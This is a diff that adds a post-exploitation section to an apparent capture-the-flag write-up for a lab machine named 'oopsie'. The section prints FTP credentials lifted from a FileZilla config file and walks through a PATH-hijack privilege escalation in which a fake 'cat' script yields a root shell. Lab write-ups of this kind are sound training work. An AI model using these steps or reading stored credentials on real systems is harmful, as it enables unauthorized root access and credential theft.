@@ -267,3 +267,42 @@ af13b0bee69f8a877c3faf667f7beacf
 ```
 There we go. We pwned the machine.
 
+## Post Exploitation
+
+For the next challenge we need FTP credentials, which are stored in this file:
+
+```
+root@oopsie:/root/.config/filezilla# more filezilla.xml 
+<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
+<FileZilla3>
+    <RecentServers>
+        <Server>
+            <Host>10.10.10.46</Host>
+            <Port>21</Port>
+            <Protocol>0</Protocol>
+            <Type>0</Type>
+            <User>ftpuser</User>
+            <Pass>mc@F1l3ZilL4</Pass>
+            <Logontype>1</Logontype>
+            <TimezoneOffset>0</TimezoneOffset>
+            <PasvMode>MODE_DEFAULT</PasvMode>
+            <MaximumMultipleConnections>0</MaximumMultipleConnections>
+            <EncodingType>Auto</EncodingType>
+            <BypassProxy>0</BypassProxy>
+        </Server>
+    </RecentServers>
+</FileZilla3>
+```
+
+Either "guess" this common filename or extend the privilege escalation by doing following:
+
+As we know that the bugtracker binary calls `cat filename`, we can simply modify the cat binary for our user.
+
+```
+export PATH=/tmp/:$PATH
+
+cd /tmp && echo '/bin/bash' > cat && chmod +x cat
+```
+
+Now when executing the `bugtracker` binary, we get a root-shell.
+
